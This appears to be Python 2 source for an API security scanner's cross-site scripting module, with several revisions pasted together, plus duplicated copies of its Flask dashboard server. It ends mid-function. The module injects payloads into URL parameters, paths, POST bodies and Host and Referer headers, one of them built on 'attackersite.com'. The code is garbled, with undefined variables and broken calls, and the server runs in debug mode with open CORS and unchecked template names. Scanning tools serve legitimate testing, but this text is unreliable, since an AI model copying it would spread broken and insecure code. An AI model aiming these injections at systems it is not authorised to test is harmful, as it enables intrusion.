import os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain'in xss_request['Content-Type']:                    
            impact = "Low"
        else:
            impact = "High"
    else:
        impact = "Low"

    return impact

def xss_get_method(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    result = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                logs.logging.info("GET param for xss : %s",key)
                xss_payloads = fetch_xss_payload()                    
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        xss_url = url.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,"GET",headers)
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info("%s is vulnerable to XSS",url)                    
                            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                            dbupdate.insert_record(attack_result)
                            result = True

                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
                    for uri_list in uri_check_list:
                        if uri_list in url:
                            # Parse domain name from URI.
                            parsed_url = urlparse.urlparse(url).scheme+"://"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
                            break
                    if parsed_url == '':
                        parsed_url = url

                    xss_request_url = req.api_request(parsed_url+'/'+payload,"GET",headers)
                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,"GET",headers)             
                    logs.logging.info("%s is vulnerable to XSS",url)                    
                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:                    
                        impact = check_xss_impact(xss_request_url.headers)                    
                        print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                        attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                        dbupdate.insert_record(attack_result)
           
            except:
                logs.logging.info("XSS: No GET param found!")

def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    xss_payloads = fetch_xss_payload()                    
    xss_get_method(url,method,headers,body,scanid)                    
    xss_http_headers(url,method,headers,body,scanid)                    

import os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain'in xss_request['Content-Type']:                    
            impact = "Low"
        else:
            impact = "High"
    else:
        impact = "Low"

    return impact

def xss_get_method(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    result = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                logs.logging.info("GET param for xss : %s",key)
                xss_payloads = fetch_xss_payload()                    
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        xss_url = url.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,"GET",headers)
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info("%s is vulnerable to XSS",url)                    
                            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                            dbupdate.insert_record(attack_result)
                            result = True

                    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
                    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
                    for uri_list in uri_check_list:
                        if uri_list in url:
                            # Parse domain name from URI.
                            parsed_url = urlparse.urlparse(url).scheme+"://"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
                            break
                    if parsed_url == '':
                        parsed_url = url

                    xss_request_url = req.api_request(parsed_url+'/'+payload,"GET",headers)
                    xss_request_uri = req.api_request(parsed_url+'/?test='+payload,"GET",headers)             
                    logs.logging.info("%s is vulnerable to XSS",url)                    
                    if xss_request_url.text.find(payload) != -1 or xss_request_uri.text.find(payload) != -1:                    
                        impact = check_xss_impact(xss_request_url.headers)                    
                        print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                        attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                        dbupdate.insert_record(attack_result)
           
            except:
                logs.logging.info("XSS: No GET param found!")

def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    xss_payloads = fetch_xss_payload()                    
    xss_get_method(url,method,headers,body,scanid)                    
    xss_http_headers(url,method,headers,body,scanid)                    

import os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list                    

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain' in xss_request['Content-Type']:                    
            # Possible XSS 
            impact = "Low"
        else:
            impact = "High"
    else:
        impact = "Low"

    return impact                    


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    xss_result = ''                    
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+"://"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
            xss_request_url = req.api_request(parsed_url+'/'+payload,"GET",headers)
            if xss_request_url.text.find(payload) != -1:                    
                impact = check_xss_impact(xss_request_url.headers)                    
                xss_result = True                    

            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,"GET",headers)             
            if xss_request_url.text.find(payload) != -1:                    
                impact = check_xss_impact()
                xss_result = True                    

            if xss_result is True:                    
                print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}                    
                dbupdate.insert_record(attack_result)
                return                    

def xss_get_uri(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info("GET param for xss : %s",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        print "param to test",key                    
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+"://"+parsed_url.netloc+parsed_url.path+"/?"+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,"GET",headers)
                        print xss_request.text                    
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info("%s is vulnerable to XSS",url)
                            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info("XSS: No GET param found!")

        print "all params",vul_param                    


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)
        #xss_http_headers(url,method,headers,body,scanid)

import os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list                    

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    if res_headers['Content-Type']:
        if 'application/json' or 'text/plain' in xss_request['Content-Type']:                    
            # Possible XSS 
            impact = "Low"
        else:
            impact = "High"
    else:
        impact = "Low"

    return impact                    


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    xss_result = ''                    
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+"://"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
            xss_request_url = req.api_request(parsed_url+'/'+payload,"GET",headers)
            if xss_request_url.text.find(payload) != -1:                    
                impact = check_xss_impact(xss_request_url.headers)                    
                xss_result = True                    

            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,"GET",headers)             
            if xss_request_url.text.find(payload) != -1:                    
                impact = check_xss_impact()
                xss_result = True                    

            if xss_result is True:                    
                print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}                    
                dbupdate.insert_record(attack_result)
                return                    

def xss_get_uri(url,method,headers,body,scanid=None):
    # Test for XSS in GET param
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info("GET param for xss : %s",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        print "param to test",key                    
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+"://"+parsed_url.netloc+parsed_url.path+"/?"+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,"GET",headers)
                        print xss_request.text                    
                        if xss_request.text.find(payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info("%s is vulnerable to XSS",url)
                            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info("XSS: No GET param found!")

        print "all params",vul_param                    


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)
        #xss_http_headers(url,method,headers,body,scanid)

import ast
import json
import sys
import hashlib
import time

sys.path.append('../')

from flask import Flask,render_template
from flask import Response,make_response
from flask import request
from flask import Flask
from apiscan import scan_single_api                    
from flask import jsonify
from pymongo import MongoClient
from utils.vulnerabilities import alerts
 
app = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')
 
# Mongo DB connection 
client = MongoClient('localhost',27017)
global db
db = client.apiscan


############################# Start scan API ######################################
def generate_hash():
    # Return md5 hash value of current timestmap 
    scanid = hashlib.md5(str(time.time())).hexdigest()
    return scanid

# Start the scan and returns the message
@app.route('/scan/', methods = ['POST'])
def start_scan():
    scanid = generate_hash()
    content = request.get_json()
    try:
        name = content['appname']
        url = content['url']
        headers = content['headers']
        body = content['body']
        method = content['method']
        api = "Y"
        scan_status = scan_single_api(url, method, headers, body, api, scanid)
        if scan_status is True:
            # Success
            msg = {"status" : scanid}
            try:
                db.scanids.insert({"scanid" : scanid, "name" : name, "url" : url})
            except:
                print "Failed to update DB"
        else:
            msg = {"status" : "Failed"}
    
    except:
        msg = {"status" : "Failed"} 
    
    return jsonify(msg)


#############################  Fetch ScanID API #########################################
@app.route('/scan/scanids/', methods=['GET'])
def fetch_scanids():
    scanids = []
    records = db.scanids.find({})
    if records:
        for data in records:
            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
                if data['scanid']:
                    if data['scanid'] not in scanids:
                        scanids.append({"scanid" : data['scanid'], "name" : data['name'], "url" : data['url']}) 
            except:
                pass

        return jsonify(scanids)
############################# Alerts API ##########################################

# Returns vulnerbilities identified by tool 
def fetch_records(scanid):
    # Return alerts identified by the tool
    vul_list = []
    records = db.vulnerabilities.find({"scanid":scanid})
    print "Records are ",records
    if records:
        for data in records:  
            print "Data is",data
            if data['req_body'] == None:
                data['req_body'] = "NA" 

            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
            except:
                print "Falied to parse"

            print "Data",data
            try:
                if data['id'] == "NA":
                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}
                    vul_list.append(all_data)

                if data['id']:
                    for vul in alerts:
                        if data['id'] == vul['id']:
                            all_data = {
                                        'url' : data['url'],
                                        'impact' : data['impact'],
                                        'name' : data['alert'],
                                        'req_headers' : data['req_headers'],
                                        'req_body' : data['req_body'],
                                        'res_headers' : data['res_headers'],
                                        'res_body' : data['res_body'],
                                        'Description' : vul['Description'],
                                        'remediation' : vul['remediation']
                                        }
                            vul_list.append(all_data)
                            break

            except:
                pass

        print vul_list
        return vul_list
        

@app.route('/alerts/<scanid>', methods=['GET'])
def return_alerts(scanid):
    print "ScanID is ",scanid
    result = fetch_records(scanid)
    resp = jsonify(result)
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp

#############################Dashboard#########################################

@app.route('/', defaults={'page': 'scan.html'})
@app.route('/<page>')
def view_dashboard(page):
    return render_template('{}'.format(page))

app.run(host='0.0.0.0', port= 8094,debug=True)

import ast
import json
import sys
import hashlib
import time

sys.path.append('../')

from flask import Flask,render_template
from flask import Response,make_response
from flask import request
from flask import Flask
from apiscan import scan_single_api                    
from flask import jsonify
from pymongo import MongoClient
from utils.vulnerabilities import alerts
 
app = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')
 
# Mongo DB connection 
client = MongoClient('localhost',27017)
global db
db = client.apiscan


############################# Start scan API ######################################
def generate_hash():
    # Return md5 hash value of current timestmap 
    scanid = hashlib.md5(str(time.time())).hexdigest()
    return scanid

# Start the scan and returns the message
@app.route('/scan/', methods = ['POST'])
def start_scan():
    scanid = generate_hash()
    content = request.get_json()
    try:
        name = content['appname']
        url = content['url']
        headers = content['headers']
        body = content['body']
        method = content['method']
        api = "Y"
        scan_status = scan_single_api(url, method, headers, body, api, scanid)
        if scan_status is True:
            # Success
            msg = {"status" : scanid}
            try:
                db.scanids.insert({"scanid" : scanid, "name" : name, "url" : url})
            except:
                print "Failed to update DB"
        else:
            msg = {"status" : "Failed"}
    
    except:
        msg = {"status" : "Failed"} 
    
    return jsonify(msg)


#############################  Fetch ScanID API #########################################
@app.route('/scan/scanids/', methods=['GET'])
def fetch_scanids():
    scanids = []
    records = db.scanids.find({})
    if records:
        for data in records:
            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
                if data['scanid']:
                    if data['scanid'] not in scanids:
                        scanids.append({"scanid" : data['scanid'], "name" : data['name'], "url" : data['url']}) 
            except:
                pass

        return jsonify(scanids)
############################# Alerts API ##########################################

# Returns vulnerbilities identified by tool 
def fetch_records(scanid):
    # Return alerts identified by the tool
    vul_list = []
    records = db.vulnerabilities.find({"scanid":scanid})
    print "Records are ",records
    if records:
        for data in records:  
            print "Data is",data
            if data['req_body'] == None:
                data['req_body'] = "NA" 

            data.pop('_id')
            try:
                data =  ast.literal_eval(json.dumps(data))
            except:
                print "Falied to parse"

            print "Data",data
            try:
                if data['id'] == "NA":
                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}
                    vul_list.append(all_data)

                if data['id']:
                    for vul in alerts:
                        if data['id'] == vul['id']:
                            all_data = {
                                        'url' : data['url'],
                                        'impact' : data['impact'],
                                        'name' : data['alert'],
                                        'req_headers' : data['req_headers'],
                                        'req_body' : data['req_body'],
                                        'res_headers' : data['res_headers'],
                                        'res_body' : data['res_body'],
                                        'Description' : vul['Description'],
                                        'remediation' : vul['remediation']
                                        }
                            vul_list.append(all_data)
                            break

            except:
                pass

        print vul_list
        return vul_list
        

@app.route('/alerts/<scanid>', methods=['GET'])
def return_alerts(scanid):
    print "ScanID is ",scanid
    result = fetch_records(scanid)
    resp = jsonify(result)
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp

#############################Dashboard#########################################

@app.route('/', defaults={'page': 'scan.html'})
@app.route('/<page>')
def view_dashboard(page):
    return render_template('{}'.format(page))

app.run(host='0.0.0.0', port= 8094,debug=True)

import os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print "response header",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = "Low"
        else:
            impact = "High"
    else:
        impact = "Low"

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print "updated body",temp_body
            xss_post_request = req.api_request(url, "POST", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post.body)                    
                if db_update is not True:
                    attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({"scanid": scanid}, {"$set" : {"scan_data" : post_vul_param+" are vulnerable to XSS"}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {"Host" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, "GET", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = "Low"
            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": host_header_xss.headers ,"res_body": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {"Referer" : referer_header_value}
        temp_headers.update(referer_header)
        ref_header_xss = req.api_request(url, "GET", temp_headers)
        decoded_payload = xss_payload_decode(payload)
        if ref_header_xss.text.find(decoded_payload) != -1:
            print ref_header_xss.text
            impact = check_xss_impact(temp_headers)
            print "%s[{0}] {1} is vulnerable to XSS via referer header%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting via referer header", "impact": impact, "req_headers": temp_headers, "req_body":body, "res_headers": ref_header_xss.headers ,"res_body": ref_header_xss.text}
            dbupdate.insert_record(attack_result)
            return


def xss_get_url(url,method,headers,body,scanid=None):
    # Check for URL based XSS. 
    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>
    result = ''
    xss_payloads = fetch_xss_payload()
    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']
    for uri_list in uri_check_list:
        if uri_list in url:
            # Parse domain name from URI.
            parsed_url = urlparse.urlparse(url).scheme+"://"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path
            break

    if parsed_url == '':
        parsed_url = url

    for payload in xss_payloads:
        xss_request_url = req.api_request(parsed_url+'/'+payload,"GET",headers)
        if result is not True:
            decoded_payload = xss_payload_decode(payload)
            if xss_request_url.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_request_url.headers)
                attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request_url.headers ,"res_body": xss_request_url.text}
                dbupdate.insert_record(attack_result)
                result = True

        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,"GET",headers)             
        if xss_request_url.text.find(decoded_payload) != -1:
            impact = check_xss_impact(xss_request_uri.headers)
            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request_url.headers ,"res_body": xss_request_url.text}
            dbupdate.insert_record(attack_result)
                

def xss_get_uri(url,method,headers,body,scanid=None):
    # This function checks for URI based XSS. 
    # http://localhost/?firstname=<payload>&lastname=<payload>
    db_update = ''
    vul_param = ''
    url_query = urlparse.urlparse(url)
    parsed_query = urlparse.parse_qs(url_query.query)
    if parsed_query:
        for key,value in parsed_query.items():
            try:
                result = ''
                logs.logging.info("GET param for xss : %s",key)
                xss_payloads = fetch_xss_payload()
                for payload in xss_payloads:
                    # check for URI based XSS
                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>
                    if result is not True:
                        parsed_url = urlparse.urlparse(url)
                        xss_url = parsed_url.scheme+"://"+parsed_url.netloc+parsed_url.path+"/?"+parsed_url.query.replace(value[0], payload)
                        xss_request = req.api_request(xss_url,"GET",headers)
                        decoded_payload = xss_payload_decode(payload)
                        print decoded_payload
                        print xss_url
                        if xss_request.text.find(decoded_payload) != -1:
                            impact = check_xss_impact(xss_request.headers)
                            logs.logging.info("%s is vulnerable to XSS",url)
                            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
                            if db_update is not True:
                                attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                                dbupdate.insert_record(attack_result)
                                result,db_update = True,True
                                vul_param += key
                            else:
                                result = True
                                if vul_param == '':
                                    vul_param += key
                                else:
                                    vul_param += ','+key                  
        
            except:
                logs.logging.info("XSS: No GET param found!")

        if vul_param:
            # Update all vulnerable params to db.
            print vul_param,scanid
            dbupdate.update_record({"scanid": scanid}, {"$set" : {"scan_data" : vul_param+" parameters are vulnerable to XSS"}})


def xss_check(url,method,headers,body,scanid):
    # Main function for XSS attack
    if method == 'GET' or method == 'DEL':
        xss_get_uri(url,method,headers,body,scanid)
        xss_get_url(url,method,headers,body,scanid)

    if method == 'POST' or method == 'PUT':
        xss_post_method(url,method,headers,body,scanid)

    xss_http_headers(url,method,headers,body,scanid)

import os
import urlparse
import sendrequest as req
import utils.logs as logs
import urlparse
import time
import urllib

from utils.logger import logger
from utils.db import Database_update
from utils.config import get_value

dbupdate = Database_update()
api_logger = logger()

def fetch_xss_payload():
    # Returns xss payloads in list type
    payload_list = []
    if os.getcwd().split('/')[-1] == 'API':
        path = '../Payloads/xss.txt'
    else:
        path = 'Payloads/xss.txt'

    with open(path) as f:
        for line in f:
            if line:
                payload_list.append(line.rstrip())

    return payload_list

def check_xss_impact(res_headers):
    # Return the impact of XSS based on content-type header
    print "response header",res_headers['Content-Type']
    if res_headers['Content-Type']:
        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:
            # Possible XSS 
            impact = "Low"
        else:
            impact = "High"
    else:
        impact = "Low"

    return impact


def xss_payload_decode(payload):
    # Return decoded payload of XSS. 
    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')
    return decoded_payload

def xss_post_method(url,method,headers,body,scanid=None):
    # This function checks XSS through POST method.
    print url, headers,method,body
    temp_body = {}
    post_vul_param = ''
    for key,value in body.items():
        xss_payloads = fetch_xss_payload()
        for payload in xss_payloads:
            temp_body.update(body)
            temp_body[key] = payload
            print "updated body",temp_body
            xss_post_request = req.api_request(url, "POST", headers, temp_body)
            decoded_payload = xss_payload_decode(payload)
            if xss_post_request.text.find(decoded_payload) != -1:
                impact = check_xss_impact(xss_post.body)                    
                if db_update is not True:
                    attack_result = { "id" : 11, "scanid" : scanid, "url" : xss_url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": xss_request.headers ,"res_body": xss_request.text}
                    dbupdate.insert_record(attack_result)
                    db_update = True
                    vul_param += key
                else:
                    result = True
                    if vul_param == '':
                        post_vul_param += key
                    else:
                        post_vul_param += ','+key 

    if post_vul_param:
        dbupdate.update_record({"scanid": scanid}, {"$set" : {"scan_data" : post_vul_param+" are vulnerable to XSS"}})


def xss_http_headers(url,method,headers,body,scanid=None):
    # This function checks different header based XSS.
    # XSS via Host header (Limited to IE)
    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/
    temp_headers = {}
    temp_headers.update(headers)
    xss_payloads = fetch_xss_payload()
    for payload in xss_payloads:
        parse_domain = urlparse.urlparse(url).netloc
        host_header = {"Host" : parse_domain + '/' + payload}
        headers.update(host_header)
        host_header_xss = req.api_request(url, "GET", headers)
        decoded_payload = xss_payload_decode(payload)
        if host_header_xss.text.find(decoded_payload) != -1:
            impact = "Low"
            print "%s[{0}] {1} is vulnerable to XSS%s".format(impact,url)% (api_logger.G, api_logger.W)
            attack_result = { "id" : 11, "scanid" : scanid, "url" : url, "alert": "Cross Site Scripting", "impact": impact, "req_headers": headers, "req_body":body, "res_headers": host_header_xss.headers ,"res_body": host_header_xss.text}
            dbupdate.insert_record(attack_result)
            break

    # Test for Referer based XSS 
    for payload in xss_payloads:
        referer_header_value = 'http://attackersite.com?test='+payload
        referer_header = {"Referer" : referer_header_value}
